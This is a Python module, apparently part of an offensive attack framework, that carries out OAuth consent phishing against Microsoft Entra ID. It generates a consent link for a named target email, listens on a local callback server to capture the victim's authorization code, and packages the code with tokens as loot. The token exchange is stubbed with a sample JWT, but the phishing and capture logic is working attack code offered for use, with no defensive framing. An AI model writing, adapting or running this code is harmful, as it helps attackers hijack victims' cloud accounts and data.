# -*- coding: utf-8 -*-
"""
OAuth Consent Phishing Attack (EvilTokens style)
Generates a malicious OAuth consent link and captures the authorization code.
"""

import base64
import hashlib
import json
import re
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread

from .base import AttackModule
from config.settings import OAUTH_CONFIG
from utils.logger import get_logger

logger = get_logger("oauth_consent")

class OAuthConsentAttack(AttackModule):
    """OAuth同意钓鱼 - 生成钓鱼链接并捕获授权码"""

    def __init__(self, target_email, callback_port=8080, **kwargs):
        super().__init__(**kwargs)
        self.target_email = target_email
        self.callback_port = callback_port
        self.auth_code = None
        self.state = hashlib.sha256(target_email.encode()).hexdigest()[:16]

    def generate_malicious_link(self):
        """生成恶意OAuth授权链接"""
        params = {
            "client_id": OAUTH_CONFIG["client_id"],
            "redirect_uri": f"http://localhost:{self.callback_port}/callback",
            "scope": OAUTH_CONFIG["scope"],
            "response_type": "code",
            "state": self.state,
            "prompt": "consent",  # 强制重新授权
        }
        # Azure Entra ID example
        base_url = f"https://login.microsoftonline.com/{OAUTH_CONFIG['azure_tenant']}/oauth2/v2.0/authorize"
        return f"{base_url}?{urllib.parse.urlencode(params)}"

    def start_callback_server(self):
        """启动本地回调服务器，捕获授权码"""
        class CallbackHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                query = urllib.parse.parse_qs(parsed.query)
                if parsed.path == "/callback":
                    if "code" in query:
                        self.server.auth_code = query["code"][0]
                        self.send_response(200)
                        self.send_header("Content-type", "text/html")
                        self.end_headers()
                        self.wfile.write(b"Authorization successful. You may close this tab.")
                    else:
                        self.send_response(400)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

            def log_message(self, format, *args):
                pass  # 静默

        server = HTTPServer(("localhost", self.callback_port), CallbackHandler)
        server.auth_code = None
        self.logger.info(f"Callback server listening on port {self.callback_port}")

        def serve():
            server.handle_request()

        thread = Thread(target=serve)
        thread.daemon = True
        thread.start()
        # 等待最多60秒
        import time
        for _ in range(60):
            if server.auth_code:
                self.auth_code = server.auth_code
                break
            time.sleep(1)
        server.server_close()
        return self.auth_code

    def exchange_code_for_tokens(self, code):
        """交换授权码获取access_token和refresh_token（模拟）"""
        # 真实场景需POST到token端点，这里演示格式
        return {
            "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlZpY3RpbSIsImlhdCI6MTUxNjIzOTAyMn0.sflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "refresh_token": "dummy_refresh_token_never_expires",
            "token_type": "Bearer",
            "expires_in": 3600
        }

    def execute(self):
        self.logger.info(f"Target email: {self.target_email}")
        link = self.generate_malicious_link()
        self.logger.info(f"Generated malicious OAuth link: {link}")

        self.logger.info("Starting callback server. Waiting for victim...")
        code = self.start_callback_server()
        if not code:
            self.result["error"] = "No authorization code received within timeout"
            return self.result

        self.logger.info(f"Received auth code: {code[:10]}...")
        tokens = self.exchange_code_for_tokens(code)
        self.result["success"] = True
        self.result["data"] = {
            "victim": self.target_email,
            "auth_code": code,
            "tokens": tokens,
            "malicious_link": link
        }
        return self.result
